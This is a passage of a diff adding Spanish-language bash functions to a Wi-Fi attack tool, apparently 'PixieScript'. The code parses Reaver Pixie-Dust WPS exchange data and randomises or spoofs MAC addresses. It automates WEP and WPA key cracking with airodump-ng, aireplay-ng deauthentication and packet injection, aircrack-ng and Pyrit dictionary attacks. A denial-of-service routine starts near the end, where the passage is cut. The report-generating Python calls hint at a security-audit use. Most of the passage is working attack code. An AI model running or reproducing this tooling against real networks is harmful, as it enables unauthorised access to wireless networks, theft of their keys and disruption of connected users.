+	then
+	    sed '/'$BSSID'/d' $ARCHIVO_REDES_ATACADAS | sed '/^$/d' > TEMPORAL
+	    mv TEMPORAL $ARCHIVO_REDES_ATACADAS
+	    echo $BSSID" "$CASO >> $ARCHIVO_REDES_ATACADAS
+	    return
+	fi
+    fi
+    if [ $CASO_VIEJO = "NV" ]
+    then
+      if [ $CASO = "PC" ] 
+	then
+	    sed '/'$BSSID'/d' $ARCHIVO_REDES_ATACADAS | sed '/^$/d' > TEMPORAL
+	    mv TEMPORAL $ARCHIVO_REDES_ATACADAS
+	    echo $BSSID" "$CASO >> $ARCHIVO_REDES_ATACADAS
+	    if ! grep -q $BSSID $ARCHIVO_VULNERABLES
+	    then
+		echo $BSSID >> $ARCHIVO_VULNERABLES
+	    fi
+	    return
+	fi
+    fi
+  else
+    echo $BSSID" "$CASO >> $ARCHIVO_REDES_ATACADAS
+    if [ $CASO = "PC" ] 
+    then
+      if ! grep -q $BSSID $ARCHIVO_VULNERABLES
+      then
+	echo $BSSID >> $ARCHIVO_VULNERABLES
+      fi
+    fi
+   fi
+ }
+
+
+
+ExtraerDatosReaver() {
+echo "$BSSID : EXTRAYENDO DATOS ATAQUE REAVER ..." > $ARCHIVO_STATUSBAR
+let TOTAL=0
+
+TOTAL=$(wc -l $ARCHIVO_TXT_ATAQUE | awk {'print $1'})
+
+for A in `seq 1 $TOTAL` ; do
+  linea=`head -$A $ARCHIVO_TXT_ATAQUE | tail -1`
+  if [[ $linea == *PKe* ]]
+  then
+  PKe=`echo $linea | awk 'BEGIN{FS=":"}{print $NF}'`
+  PKe=`echo $PKe | sed 's/ /:/g'`
+  continue
+  fi
+  
+  if [[ $linea == *PKr* ]]
+  then
+  PKr=`echo $linea | awk 'BEGIN{FS=":"}{print $NF}'`
+  PKr=`echo $PKr | sed 's/ /:/g'`
+  continue
+  fi
+  
+  if [[ $linea == *E-Hash1* ]]
+  then
+  EHash1=`echo $linea | awk 'BEGIN{FS=":"}{print $NF}'`
+  EHash1=`echo $EHash1 | sed 's/ /:/g'`
+  continue
+  fi
+  
+  if [[ $linea == *E-Hash2* ]]
+  then
+  EHash2=`echo $linea | awk 'BEGIN{FS=":"}{print $NF}'`
+  EHash2=`echo $EHash2 | sed 's/ /:/g'`
+  continue
+  fi
+  
+  if [[ $linea == *AuthKey* ]]
+  then
+  AuthKey=`echo $linea | awk 'BEGIN{FS=":"}{print $NF}'`
+  AuthKey=`echo $AuthKey | sed 's/ /:/g'`
+  continue
+  fi
+  
+  if [[ $linea == *E-Nonce* ]]
+  then
+  Enrollee=`echo $linea | awk 'BEGIN{FS=":"}{print $NF}'`
+  Enrollee=`echo $Enrollee | sed 's/ /:/g'`
+  continue
+  fi
+  
+  if [[ $linea == *ESSID* ]]
+  then
+  ESSID=`echo $linea | awk {' print $6 '}`
+  ESSID=`echo $ESSID | sed 's/)/ /g'`
+  continue
+  fi
+  
+  if [[ $linea == *Fabricante* ]]
+  then
+  fabricante=$(echo $linea)
+  continue
+  fi
+  
+  if [[ $linea == *Modelo* ]]
+  then
+  modelo=$(echo $linea)
+  continue
+  fi
+  
+  if [[ $linea == *modelo* ]]
+  then
+  numero_de_modelo=$(echo $linea)
+  continue
+  fi
+  
+  if [[ $linea == *serie* ]]
+  then
+  numero_de_serie=$(echo $linea)
+  continue
+  fi
+  
+  if [[ $linea == *Device* ]]
+  then
+  device_name=$(echo $linea)
+  continue
+  fi
+  
+done
+
+  if [ -z $PKr ] 
+  then
+    MENSAJE_ERROR="NO SE HAN PODIDO OBTENER LA CLAVE PKR"
+    return 1
+  fi
+  if [ -z $PKe ] 
+  then
+    MENSAJE_ERROR="NO SE HAN PODIDO OBTENER LA CLAVE PKE"
+    return 1
+  fi
+  if [ -z $EHash1 ] 
+  then
+    MENSAJE_ERROR="NO SE HAN PODIDO OBTENER LA CLAVE EHASH1"
+    return 1
+  fi
+  if [ -z $EHash2 ] 
+  then
+    MENSAJE_ERROR="NO SE HAN PODIDO OBTENER LA CLAVE EHASH2"
+    return 1
+  fi
+  if [ -z $AuthKey ] 
+  then
+    MENSAJE_ERROR="NO SE HAN PODIDO OBTENER LA CLAVE AUTHKEY"
+    return 1
+  fi
+  if [ -z $Enrollee ] 
+  then
+    MENSAJE_ERROR="NO SE HAN PODIDO OBTENER LA CLAVE Enrollee Nonce"
+    return 1
+  fi
+  unset A TOTAL linea MENSAJE_ERROR
+  return 0
+}
+
+
+
+
+EsperarAcabarReaver() {
+for A in `seq 1 $TIEMPO_ATAQUE`
+do
+  sleep 1s
+  pid_reaver=$(ps -A | grep reaver_pixie | awk '{ print $1 }')
+  
+  if [ -n "$pid_reaver" ]
+  then
+      if [ $A -eq $TIEMPO_ATAQUE ]
+      then
+	  if [ $vez -eq 1 ] 
+	  then
+	      echo "NO SE HAN PODIDO OBTENER LOS DATOS NECESARIOS DE $BSSID, ATAQUE REAVER FALLIDO 2" > $ARCHIVO_STATUSBAR
+	  else
+	      echo -e "NO SE HAN PODIDO RECUPERAR LA CLAVE WPA DE $BSSID" > $ARCHIVO_STATUSBAR 
+	  fi
+	  MatarReaver
+	  unset A pid_reaver TIEMPO_RESTANTE
+	  return 1
+      else
+  	if [ -f  $ARCHIVO_DETENER_ATAQUE ]
+	then
+	  echo "ATAQUE DETENIDO ..." > $ARCHIVO_STATUSBAR
+	  rm $ARCHIVO_DETENER_ATAQUE
+	  pid_reaver=`ps -A | grep reaver_pixie | awk '{ print $1}'`
+	  kill $pid_reaver &> /dev/null
+	  ATAQUE_DETENIDO="SI"
+	  return
+	fi
+
+	  TIEMPO_RESTANTE=`expr $TIEMPO_ATAQUE - $A`
+	  if [ $vez -eq 1 ]; then echo "REAVER TRABAJANDO CON BSSID $BSSID, ESSID $ESSID, ESPERA $TIEMPO_RESTANTE s ..." > $ARCHIVO_STATUSBAR; fi
+      fi
+  else
+      unset A pid_reaver TIEMPO_RESTANTE
+      return
+  fi
+done
+}
+
+
+
+MatarReaver() {
+pid_reaver=`ps -A | grep reaver_pixie | awk '{ print $1 }'`
+kill $pid_reaver &> /dev/null 
+unset pid_reaver
+}
+
+
+
+ValidarMac() {
+MAC_A_VALIDAR=$1
+if [ -z $MAC_A_VALIDAR ] || [ "${#MAC_A_VALIDAR}" != 17 ]; then return 1;fi
+
+for ((i=1; i<=17; i++)); do
+    caracter=`expr substr $MAC_A_VALIDAR $i 1`
+    case $i in
+      3|6|9|12|15) if [ $caracter != ":" ]; then return 1; fi ;;
+      2) if [[ ! $caracter =~ [ACEace02468] ]]; then return 1; fi ;;
+      1|4|5|7|8|10|11|13|14|16|17) if [[ ! $caracter =~ [A-Fa-f0-9] ]]; then return 1; fi;;
+    esac
+done
+unset MAC_A_VALIDAR i caracter
+return 0
+}
+
+
+
+ValidarTiempos() {
+if [ $1 = "2" ]; then TIEMPO=$TIEMPO_SCANEO > $ARCHIVO_LOG;fi
+if [ $1 = "3" ]; then TIEMPO=$TIEMPO_ATAQUE > $ARCHIVO_LOG; fi
+
+if [ $TIEMPO -lt 1 ] ; then
+   yad --image "error" --title "ERROR" --button=gtk-ok:0 --text "<b>ERROR</b>: El tiempo máximo introducido no es correcto : [ $TIEMPO_SCANEO ]" --fixed --on-top --center --window-icon=ICONOS/SCRIPT.png
+   echo "El tiempo máximo introducido no es correcto : [ $TIEMPO_SCANEO ]" > $ARCHIVO_STATUSBAR
+   if [ $1 = "2" ]; then echo "1" > $ARCHIVO_LOG;fi
+   if [ $1 = "3" ]; then echo "FIN" > $ARCHIVO_LOG; fi
+   exit
+fi
+unset TIEMPO re
+}
+
+
+
+CopiarPortapapeles(){
+LINEA_PORTAPAPELES=$(grep $LINEA_PORTAPAPELES $ARCHIVO_DATABASE_KEYS)
+case $COLUMNA_A_COPIAR in
+  "WPA") LINEA_PORTAPAPELES=$(echo $LINEA_PORTAPAPELES | awk -F"|" {'print $4'})
+	 echo -n $LINEA_PORTAPAPELES | xclip -selection clipboard 
+	 ;;
+  "WPS") LINEA_PORTAPAPELES=$(echo $LINEA_PORTAPAPELES | awk -F"|" {'print $3'})
+	 echo -n $LINEA_PORTAPAPELES | xclip -selection clipboard 
+	 ;;
+  "TODO") LINEA_PORTAPAPELES=$(echo $LINEA_PORTAPAPELES | awk -F"|" {' print $1,$2,$3,$4,$5,$6,$7,$8,$9 '})
+	 echo -n $LINEA_PORTAPAPELES | xclip -selection clipboard 
+	 ;;
+esac
+unset LINEA_PORTAPAPELES COLUMNA_A_COPIAR
+}
+
+
+
+ExportarKeys(){
+ARCHIVO_EXP=$(date +%d-%m-%Y)
+ARCHIVO_EXP="PixieScript_$ARCHIVO_EXP.DATOS"
+PATH_ARCHIVO_EXP="$HOME/Desktop/$ARCHIVO_EXP"
+
+palabras=$(wc -w $ARCHIVO_DATABASE_KEYS | awk {' print $1 '})
+if [ "$palabras" -gt "1" ] 
+then
+  TOTAL=$(wc -l $ARCHIVO_DATABASE_KEYS | awk {'print $1'})
+  TOTAL=$(expr $TOTAL + 1)
+  for A in `seq 1 $TOTAL` ; do
+      LINEA_PORTAPAPELES=$(head -$A $ARCHIVO_DATABASE_KEYS | tail -1)
+      LINEA_PORTAPAPELES=$(echo $LINEA_PORTAPAPELES | awk -F"|" {' print $1,$2,$3,$4,$5,$6,$7,$8,$9 '})
+      echo $LINEA_PORTAPAPELES >> $PATH_ARCHIVO_EXP
+      echo "" >> $PATH_ARCHIVO_EXP
+  done 
+  echo "SE HAN EXPORTADO LOS DATOS AL ARCHIVO $ARCHIVO_EXP , LO ENCONTRARAS EN TU ESCRITORIO" > $ARCHIVO_STATUSBAR
+fi
+unset ARCHIVO_EXP LINEA_PORTAPAPELES PATH_ARCHIVO_EXP palabras TOTAL
+}
+
+
+
+ActualizarScript(){
+if ! ComprobarConexion
+then
+  yad --image "error" --title "ERROR" --button=gtk-ok:0 --text "<b>ERROR</b>: Necesitas una conexión a internet para poder actualizar" --fixed --on-top --center --window-icon=ICONOS/SCRIPT.png 
+  return
+fi
+echo "Buscando nueva versión de PixieScript" > $ARCHIVO_STATUSBAR
+wget https://sourceforge.net/projects/pixiescript/ &> /dev/null
+LINEA_VERSION=$(cat index.html | grep "/projects/pixiescript/files/latest/download" | awk {' print $4  '} | awk -F"v" {' print $2 '})
+VERSION_DISPONIBLE=$(echo $LINEA_VERSION |  awk -F"." {' print $1 '})
+SUBVERSION_DISPONIBLE=$(echo $LINEA_VERSION | awk -F"." {' print $2'})
+VERSION_ACTUAL=$(echo $VERSION | awk -F"." {' print $1 '})
+SUBVERSION_ACTUAL=$(echo $VERSION | awk -F"." {' print $2 '})
+
+ACTUALIZAR="NO"
+if [ $VERSION_ACTUAL -lt $VERSION_DISPONIBLE ]; then ACTUALIZAR="SI"; fi
+if [ $VERSION_ACTUAL -eq $VERSION_DISPONIBLE ] && [ $SUBVERSION_ACTUAL -lt $SUBVERSION_DISPONIBLE ]; then ACTUALIZAR="SI"; fi
+if [ $ACTUALIZAR = "SI"  ]
+then
+    echo "Hay una nueva versión disponible : PixieScript_v$VERSION_DISPONIBLE.$SUBVERSION_DISPONIBLE" > $ARCHIVO_STATUSBAR
+    descargar=$(yad --image "dialog-question" --title "ACTUALIZACION DISPONIBLE" --button=gtk-yes:1 --yes-label "SI" --button=gtk-no:0 --text "<b>NUEVA VERSION DISPONIBLE</b>: ¿ Quieres descargar la versión PixieScript_v$VERSION_DISPONIBLE.$SUBVERSION_DISPONIBLE ?" --width=450 --on-top --center --window-icon=ICONOS/SCRIPT.png)
+    ret=$?
+    if [ $ret = "1" ]
+    then
+	wget http://downloads.sourceforge.net/project/pixiescript/PixieScript_v$VERSION_DISPONIBLE.$SUBVERSION_DISPONIBLE.tar.gz &>/dev/null
+	mv PixieScript_v$VERSION_DISPONIBLE.$SUBVERSION_DISPONIBLE.tar.gz "$HOME/Desktop/PixieScript_v$VERSION_DISPONIBLE.$SUBVERSION_DISPONIBLE.tar.gz"
+	echo "Se ha descargado la nueva versión, la encontrarás en tu escritorio" > $ARCHIVO_STATUSBAR
+    fi
+else
+    echo "Ya dispones de la última versión del script" > $ARCHIVO_STATUSBAR
+fi
+rm index.html* &> /dev/null
+unset  VERSION_DISPONIBLE SUBVERSION_DISPONIBLE VERSION_ACTUAL SUBVERSION_ACTUAL ACTUALIZAR descargar ret
+}
+
+
+
+ActualizarDatabase(){
+if ! ComprobarConexion
+then
+  yad --image "error" --title "ERROR" --button=gtk-ok:0 --text "<b>ERROR</b>: Necesitas una conexión a internet para poder actualizar" --fixed --on-top --center --window-icon=ICONOS/SCRIPT.png 
+  return
+fi
+version_actual=$(head -1 $ARCHIVO_VULNERABLES | awk -F"." {' print $2 '} | sed -n -e '1x;1!H;${x;s-\r- -gp}')
+curl -s http://pastebin.com/raw.php?i=nk9pYusb > DATABASE_TEMP
+version_disponible=$(head -1 DATABASE_TEMP | awk -F"." {' print $2 '} | sed -n -e '1x;1!H;${x;s-\r- -gp}')
+
+let version_actual=$(printf %d $version_actual)
+let version_disponible=$(printf %d $version_disponible)
+
+if [ "$version_actual" -lt "$version_disponible" ]
+then
+  mv DATABASE_TEMP $ARCHIVO_VULNERABLES
+  echo "Se ha actualizado la base de datos de los BSSIDs vulnerables" > $ARCHIVO_STATUSBAR
+  
+else
+  rm DATABASE_TEMP
+  echo "Ya dispones de la última versión de BSSIDs vulnerables" > $ARCHIVO_STATUSBAR
+fi
+unset version_actual version_disponible
+}
+
+
+
+ComprobarConexion(){
+ping -c 4 www.google.com > /dev/null
+if [ "$?" -eq 0 ]
+then
+  return 0
+else
+  return 1
+fi
+}
+
+
+
+CambioMacRandom() {
+INTERFACE_MONITOR=$(cat $ARCHIVO_TARJETA_MONITOR) &> /dev/null
+if [ -z $INTERFACE_MONITOR ]
+then
+  yad --image "info" --title "ATENCION" --button=gtk-ok:0 --text "<b>ATENCION</b>: Debes activar primero el modo monitor para cambiar la MAC" --width=400  --on-top --center --window-icon=ICONOS/SCRIPT.png 
+  exit
+fi
+TARJETA_SELECCIONADA=$INTERFACE_MONITOR
+ifconfig $INTERFACE_MONITOR down
+macchanger -a $INTERFACE_MONITOR &> /dev/null
+ifconfig $INTERFACE_MONITOR up
+TARJETA_SELECCIONADA_MAC="$(cat "/sys/class/net/$TARJETA_SELECCIONADA/address"|tr '[:lower:]' '[:upper:]')"
+DeshabilitarNetworkManager ON
+echo "La nueva mac para $INTERFACE_MONITOR es $TARJETA_SELECCIONADA_MAC" > $ARCHIVO_STATUSBAR
+echo $TARJETA_SELECCIONADA_MAC > "$LOG_TARJETA"
+unset INTERFACE_MONITOR TARJETA_SELECCIONADA TARJETA_SELECCIONADA_MAC
+}
+
+
+
+CambioMacManual() {
+INTERFACE_MONITOR=$(cat $ARCHIVO_TARJETA_MONITOR) &> /dev/null
+if [ -z $INTERFACE_MONITOR ]
+then
+  yad --image "info" --title "ATENCION" --button=gtk-ok:0 --text "<b>ATENCION</b>: Debes activar primero el modo monitor para cambiar la MAC" --width=400  --on-top --center --window-icon=ICONOS/SCRIPT.png 
+  exit
+fi
+TARJETA_SELECCIONADA=$INTERFACE_MONITOR
+datos=$(yad --width=400 --title="CAMBIO DE MAC" --text="<b>Introduce la MAC ADRESS deseada</b>" --fixed --on-top --center --window-icon=ICONOS/SCRIPT.png \
+--form \
+--image=$ICONO_MENSAJES \
+--field="MAC ADRESS" )
+NUEVA_MAC=$(echo $datos | awk  '{print toupper($0)}' | sed 's/|/ /g')
+if [ -z $NUEVA_MAC ]; then return; fi                                                                                                                                                     
+
+if  ! ValidarMac $NUEVA_MAC
+then 
+  yad --image "error" --title "ERROR" --button=gtk-ok:0 --text "<b>ERROR</b>: Formato de mac incorrecto" --fixed --on-top --center --window-icon=ICONOS/SCRIPT.png 
+  return
+fi
+ifconfig $INTERFACE_MONITOR down
+macchanger -m $NUEVA_MAC $INTERFACE_MONITOR  &> /dev/null
+ifconfig $INTERFACE_MONITOR up
+TARJETA_SELECCIONADA_MAC="$(cat "/sys/class/net/$TARJETA_SELECCIONADA/address"|tr '[:lower:]' '[:upper:]')"
+if [ $TARJETA_SELECCIONADA_MAC = $NUEVA_MAC ]
+then
+    DeshabilitarNetworkManager ON
+    echo "La nueva mac para $INTERFACE_MONITOR es $TARJETA_SELECCIONADA_MAC" > $ARCHIVO_STATUSBAR
+else
+    echo "No se ha podido cambiar la MAC ADRESS en $INTERFACE_MONITOR" > $ARCHIVO_STATUSBAR
+fi
+unset INTERFACE_MONITOR TARJETA_SELECCIONADA datos NUEVA_MAC 
+}
+
+
+
+LIMPIAR() {
+echo "LIMPIANDO ....."
+TARJETA_SELECCIONADA=$(echo $TARJETA_SELECCIONADA | awk {' print $1 '})
+DeshabilitarNetworkManager OFF
+ResetInterface #&>/dev/null 2>&1 
+#rm -rf $RUTA_LOGS &> /dev/null
+rm -f nohup.out &> /dev/null
+killall reaver_pixie &> /dev/null
+killall FUNCIONES &> /dev/null
+killall airodump-ng &> /dev/null
+}
+
+EsperarAcabarAircrack() {
+	echo "***************** EsperarAcabarAircrack"
+	TIEMPO_ATAQUE=$1
+	for A in `seq 1 $TIEMPO_ATAQUE`
+	do
+		sleep 1s
+  
+		if [ $A -eq $TIEMPO_ATAQUE ]
+		then
+			sudo killall xterm
+			sudo killall aircrack-ng
+			return 1
+		else
+			TIEMPO_RESTANTE=$(expr $TIEMPO_ATAQUE - $A)
+		fi
+	done	
+}
+
+
+BuscarClienteConectado() {
+	echo "***********Buscando CLiente Conectado"
+	TIEMPO_ESCANEO="60"
+	TARJETA_SELECCIONADA_AUX=$TARJETA_SELECCIONADA_MAC
+	for A in `seq 1 $TIEMPO_ESCANEO` 
+	do
+	   sleep 1s
+	   Line_CSV=`wc -l "$1-01.csv" | awk '{print $1}'`
+	   HeTa=`cat "$1-01.csv" | egrep -a -n '(Station|CLIENT)' | awk -F : '{print $1}'`
+	   HeTa=`expr $HeTa - 1`
+	   tail -n +$HeTa "$1-01.csv" &> "$1-clients.csv"
+	   CLIENT=`cat "$1-clients.csv" | grep $2`
+	   TARJETA_SELECCIONADA_MAC=$(echo "$CLIENT" | awk -F "," {' print $1 '})
+
+	   if [	$TARJETA_SELECCIONADA_MAC ]
+	   then
+	      echo "Utilizando MAC cliente: $TARJETA_SELECCIONADA_MAC" > $ARCHIVO_STATUSBAR
+	      return
+	   else
+	      echo "$A: Ningún CLIENTE detectado: $TARJETA_SELECCIONADA_MAC" > $ARCHIVO_STATUSBAR
+	   fi
+	done
+	TARJETA_SELECCIONADA_MAC=$TARJETA_SELECCIONADA_AUX
+	echo "Utilizando MAC local: $TARJETA_SELECCIONADA_MAC" > $ARCHIVO_STATUSBAR
+}
+
+
+
+AircrackWEP() {
+	echo "***************** Aircrack WEP******************"
+	#CambioMacRandom
+	LINEA_AUX=$LINEA_ATAQUE
+	LINEA_ATAQUE=$(head -$LINEA_ATAQUE "$ARCHIVO_REDES_SCAN" | tail -1)
+	BSSID=$(echo "$LINEA_ATAQUE" | awk -F "|" {' print $3 '})
+	CANAL=$(echo "$LINEA_ATAQUE" | awk -F "|" {' print $4 '})
+	ESSID=$(echo "$LINEA_ATAQUE" | awk -F "|" {' print $9 '})
+	PRIVACY=$(echo "$LINEA_ATAQUE" | awk -F "|" {' print $5 '})
+	CLIENT=$(cat $ARCHIVO_CAPTURAS-clients.csv | grep $BSSID)
+	TARJETA_SELECCIONADA_MAC=$(echo "$CLIENT" | awk -F "," {' print $1 '})		
+
+	if [ ! `echo $TARJETA_SELECCIONADA_MAC | grep ":"` ]
+	then
+		#Utilizo mi propia interfaz para realizar falsa autenticación
+		TARJETA_SELECCIONADA_MAC=$(head -1 "$LOG_TARJETA" | tail -1)
+	else
+		TARJETA_SELECCIONADA_MAC=$(echo "$CLIENT" | awk -F "," {' print $1 '})		
+	fi
+
+	TARJETA_MODO_MONITOR=$(head -1 "$ARCHIVO_TARJETA_MONITOR" | tail -1) 
+	sudo airmon-ng stop $TARJETA_MODO_MONITOR	
+
+	#TARJETAS_WIFI_DISPONIBLES=$(iwconfig --version | grep "Recommend" | awk '{print $1}' | sort)	
+	INTERFAZ=`cat $ARCHIVO_TARJETA_SELECCIONADA` 
+	sudo airmon-ng start $INTERFAZ $CANAL
+	X1="airmon-ng start $INTERFAZ $CANAL"
+	
+	#sudo xterm -hold -e "airodump-ng -c $CANAL --bssid $BSSID -w $CAPTURA_AIRCRACK $TARJETA_MODO_MONITOR" &
+	(sudo airodump-ng -c $CANAL --bssid $BSSID -w $CAPTURA_AIRCRACK $TARJETA_MODO_MONITOR &>/dev/null &)
+	X2="airodump-ng -c $CANAL --bssid $BSSID -w output $TARJETA_MODO_MONITOR"
+
+	BuscarClienteConectado $CAPTURA_AIRCRACK $BSSID
+
+	echo "DESAUTENTIFICANDO E INYECTANDO PAQUETES AL CLIENTE: $TARJETA_SELECCIONADA_MAC" > $ARCHIVO_STATUSBAR
+	#sudo xterm -hold -e "aireplay-ng -0 5 -a $BSSID -c $TARJETA_SELECCIONADA_MAC $TARJETA_MODO_MONITOR" &
+	(aireplay-ng -0 5 -a $BSSID -c $TARJETA_SELECCIONADA_MAC $TARJETA_MODO_MONITOR &>/dev/null &)
+	X3="aireplay-ng -0 5 -a $BSSID -c $TARJETA_SELECCIONADA_MAC $TARJETA_MODO_MONITOR"
+	#sudo xterm -hold -e "aireplay-ng -3 -b $BSSID -h $TARJETA_SELECCIONADA_MAC $TARJETA_MODO_MONITOR" &
+	(aireplay-ng -3 -b $BSSID -h $TARJETA_SELECCIONADA_MAC $TARJETA_MODO_MONITOR &>/dev/null &)
+	X4="aireplay-ng -3 -b $BSSID -h $TARJETA_SELECCIONADA_MAC $TARJETA_MODO_MONITOR"
+	
+	TIEMPO_ESCANEO="180"
+	for A in `seq 1 $TIEMPO_ESCANEO` 
+	do
+		sleep 1s
+		if [ $A -eq $TIEMPO_ESCANEO ]
+		then
+			X5="aircrack-ng -a 1 -s output-01.cap"
+			sudo aircrack-ng -a 1 -s "$CAPTURA_AIRCRACK-01.cap" >> "$RUTA_AIRCRACK/aircrack-$BSSID.dat" &
+			echo "OBTENIENDO CLAVE MEDIANTE AIRCRACK-NG" > $ARCHIVO_STATUSBAR
+		else
+			TIEMPO_RESTANTE=$(expr $TIEMPO_ESCANEO - $A)
+		fi
+	done
+	EsperarAcabarAircrack 10
+	X6=`cat "aircrack-$BSSID.dat" | grep "WEP" | awk -F '(' '{print $2}' | awk -F 'IVs' '{print $1}'`
+	X8=`cat "aircrack-$BSSID.dat" | grep "KEY FOUND"`
+	X7="SI"
+	if [ ! `echo "aircrack-$BSSID.dat" | grep "KEY FOUND"`  ]
+	then
+		X7="NO"
+	fi
+	X9="aircrack-$BSSID.dat"
+
+	(`sudo python "$RUTA_INFORME/SECWEP1.py" $BSSID "$ESSID" $CANAL $TARJETA_SELECCIONADA_MAC`)
+	(`sudo python "$RUTA_INFORME/SUBSWEP1.py" "$X1" "$X2" "$X3" "$X4" "$X5" "$X6" "$X7" "$X8" "$X9"`)
+
+	unset A, X1, X2, X3, X4, X5, X6, X7, X8, X9, BSSID, CANAL, ESSID
+}
+
+
+AircrackWPA() {
+	echo "***************** Aircrack WPA******************"
+	CambioMacRandom
+	LINEA_ATAQUE=$LINEA_AUX
+	LINEA_ATAQUE=$(head -$LINEA_ATAQUE "$ARCHIVO_REDES_SCAN" | tail -1)
+	BSSID=$(echo "$LINEA_ATAQUE" | awk -F "|" {' print $3 '})
+	CANAL=$(echo "$LINEA_ATAQUE" | awk -F "|" {' print $4 '})
+	ESSID=$(echo "$LINEA_ATAQUE" | awk -F "|" {' print $9 '})
+	PRIVACY=$(echo "$LINEA_ATAQUE" | awk -F "|" {' print $5 '})
+	CLIENT=$(cat $ARCHIVO_CAPTURAS-clients.csv | grep $BSSID)
+	TARJETA_SELECCIONADA_MAC=$(echo "$CLIENT" | awk -F "," {' print $1 '})		
+
+	if [ ! `echo $TARJETA_SELECCIONADA_MAC | grep ":"` ]
+	then
+		#Utilizo mi propia interfaz para realizar falsa autenticación
+		TARJETA_SELECCIONADA_MAC=$(head -1 "$LOG_TARJETA" | tail -1)
+	else
+		TARJETA_SELECCIONADA_MAC=$(echo "$CLIENT" | awk -F "," {' print $1 '})		
+	fi
+
+	TARJETA_MODO_MONITOR=$(head -1 "$ARCHIVO_TARJETA_MONITOR" | tail -1) 
+	sudo airmon-ng stop $TARJETA_MODO_MONITOR
+
+	TARJETAS_WIFI_DISPONIBLES=$(iwconfig --version | grep "Recommend" | awk '{print $1}' | sort)	
+	INTERFAZ=$(echo $TARJETAS_WIFI_DISPONIBLES | awk '{print $1}')
+	sudo airmon-ng start $INTERFAZ $CANAL
+	X1="airmon-ng start $INTERFAZ $CANAL"
+	
+	sudo xterm -hold -e "airodump-ng -c $CANAL --bssid $BSSID -w $CAPTURA_AIRCRACK $TARJETA_MODO_MONITOR" &
+	X2="airodump-ng -c $CANAL --bssid $BSSID -w output $TARJETA_MODO_MONITOR"
+
+	BuscarClienteConectado $CAPTURA_AIRCRACK $BSSID
+
+	echo "....Comienzo a inyectar..."
+
+	sudo xterm -hold -e "aireplay-ng -0 1 -a $BSSID -c $TARJETA_SELECCIONADA_MAC $TARJETA_MODO_MONITOR" &
+	X3="aireplay-ng -0 1 -a $BSSID -c $TARJETA_SELECCIONADA_MAC $TARJETA_MODO_MONITOR"
+	echo "INYECTANDO PAQUETES AL CLIENTE: $TARJETA_SELECCIONADA_MAC" > $ARCHIVO_STATUSBAR
+
+	TIEMPO_ESCANEO="180"
+	for A in `seq 1 $TIEMPO_ESCANEO` 
+	do
+		sleep 1s
+		if [ $A -eq $TIEMPO_ESCANEO ]
+		then
+			X4="aircrack-ng -a 2 -s output-01.cap -w wordlist.lst"
+			sudo aircrack-ng -a 2 -s "$CAPTURA_AIRCRACK-01.cap" -w $WORDLIST >> "$RUTA_AIRCRACK/aircrack-$BSSID.dat" &
+			echo "INICIANDO ATAQUE AIRCRACK-NG UTILIZANDO DICCIONARIO....." > $ARCHIVO_STATUSBAR
+		else
+			TIEMPO_RESTANTE=$(expr $TIEMPO_ESCANEO - $A)
+		fi
+	done
+	EsperarAcabarAircrack 15
+	X5="90"
+	X6="SI"
+	if [ ! `echo "$RUTA_AIRCRACK/aircrack-$BSSID.dat" | grep "KEY FOUND"`  ]
+	then
+		X6="NO"
+	fi
+	X7="aircrack-$BSSID.dat"
+
+	(`sudo python "$RUTA_INFORME/SUBSWPA2.py" "$X1" "$X2" "$X3" "$X4" "$X5" "$X6" "$X7"`)
+
+	unset A, X1, X2, X3, X4, X5, X6, X7, BSSID, CANAL, ESSID
+	
+}
+
+AnalizarPyrit() {
+	echo "***************** Analizando con Pyrit******************"
+	LINEA_ATAQUE=$LINEA_AUX
+	LINEA_ATAQUE=$(head -$LINEA_ATAQUE "$LOG_REDES_ESCANEADAS" | tail -1)
+	BSSID=$(echo "$LINEA_ATAQUE" | awk -F "|" {' print $3 '})
+	ESSID=$(echo "$LINEA_ATAQUE" | awk -F "|" {' print $9 '})
+	
+	#Creamos el ESSI real del handshake capturado
+		#pyrit -e "$ESSID" create_essid
+	X1="pyrit –e "$ESSID" create_essid"
+	sleep 10s
+
+	#utilizamos diccionario rockyou.txt renombrado a wpa.lst
+		#pyrit -i $WORDLIST import_passwords
+	X2="pyrit -i $WORDLIST import_passwords"
+	sleep 600s
+
+	#Creamos las tablas utilizando proceso batch
+		#pyrit batch
+	X3="pyrit batch"
+
+	#Asumimos que tenemos capturado el handshake
+	#X4="pyrit -r captura-01.cap attack_db"
+	#pyrit -r "$CAPTURA_AIRCRACK-01.cap" attack_db >> "$LOG_PYRIT" &
+	#Si no deseamos utilizad la Base de Datos utilizamos lo siguiente, pero es mas lento. 
+		#pyrit -r $CAPTURA_AIRCRACK-01.cap -i $WORDLIST attack_passthrough >> "$LOG_PYRIT" &
+	X4="pyrit -r captura-01.cap -i wordlist attack_passthrough"
+
+	X5="60"
+	CLAVE=$(cat $LOG_PYRIT | grep "The password is")
+	X6="SI"
+
+	if [ ! `echo $CLAVE | grep "The password is"` ]
+	then
+		X6="NO"
+	fi
+
+	#pyrit -e $ESSID -o $COWFILE export_cowpatty
+	#cowpatty -d $COWFILE -s $ESSID -r "$CAPTURA_AIRCRACK-01.cap"
+
+	X7="PYRIT.LOG"
+
+	(sudo `python $RUTA_INFORME/SUBSWPA3.py "$X1" "$X2" "$X3" "$X4" "$X5" "$X6" "$X7"`)
+
+}
+
+
+DenegacionServicio() {
+	echo "***************** Denegacion de Servicio******************"
+	LINEA_ATAQUE=$LINEA_AUX
+	LINEA_ATAQUE=$(head -$LINEA_ATAQUE "$ARCHIVO_REDES_SCAN" | tail -1)
+	BSSID=$(echo "$LINEA_ATAQUE" | awk -F "|" {' print $3 '})
+	CANAL=$(echo "$LINEA_ATAQUE" | awk -F "|" {' print $4 '})
+	ESSID=$(echo "$LINEA_ATAQUE" | awk -F "|" {' print $9 '})
+	CLIENT=$(cat $ARCHIVO_CAPTURAS-clients.csv | grep $BSSID)
+	TARJETA_SELECCIONADA_MAC=$(echo "$CLIENT" | awk -F "," {' print $1 '})		
+
+	if [ ! `echo $TARJETA_SELECCIONADA_MAC | grep ":"` ]
+	then
+		#Utilizo mi propia interfaz para realizar falsa autenticación
+		TARJETA_SELECCIONADA_MAC=$(head -1 "$LOG_TARJETA" | tail -1)
+	else
+		TARJETA_SELECCIONADA_MAC=$(echo "$CLIENT" | awk -F "," {' print $1 '})		
+	fi
+
+	
+	TARJETA_MODO_MONITOR=$(head -1 "$ARCHIVO_TARJETA_MONITOR" | tail -1) 
+	sudo airmon-ng stop $TARJETA_MODO_MONITOR
+
+	#TARJETAS_WIFI_DISPONIBLES=$(iwconfig --version | grep "Recommend" | awk '{print $1}' | sort)	
